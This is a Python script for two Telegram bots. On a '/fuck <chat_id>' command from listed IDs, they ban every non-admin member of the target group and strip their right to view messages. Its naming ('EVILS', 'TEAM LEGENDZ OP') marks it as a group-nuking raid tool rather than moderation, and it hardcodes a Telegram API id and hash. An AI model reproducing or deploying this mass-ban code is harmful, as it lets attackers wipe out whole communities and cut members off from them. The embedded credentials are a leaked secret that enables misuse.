import logging
from os import getenv
from telethon import TelegramClient, events
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChatBannedRights,
)

BOT_TOKEN1 = getenv("BOT_TOKEN1")
BOT_TOKEN2 = getenv("BOT_TOKEN2")

EVILS = getenv("ALTRON").split(" ")

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

logging.basicConfig(level=logging.INFO)
Evil1 = TelegramClient('EVIL1', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN1)
Evil2 = TelegramClient('EVIL2', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN2)


@Evil1.on(events.NewMessage(pattern="^/fuck"))
@Evil2.on(events.NewMessage(pattern="^/fuck"))
async def banall(event):
    if str(event.sender_id) in EVILS:
        chat_id = int(event.text.split(" ")[1])
        admins = await event.client.get_participants(chat_id, filter=ChannelParticipantsAdmins)
        admins_id = [i.id for i in admins]
        async for user in event.client.iter_participants(chat_id):
            try:
                uid = user.id
                if uid not in admins_id and uid not in EVILS:
                    await event.client(EditBannedRequest(chat_id, uid, RIGHTS))
            except:
                pass


print("TEAM LEGENDZ OP")

Evil1.run_until_disconnected()
Evil2.run_until_disconnected()
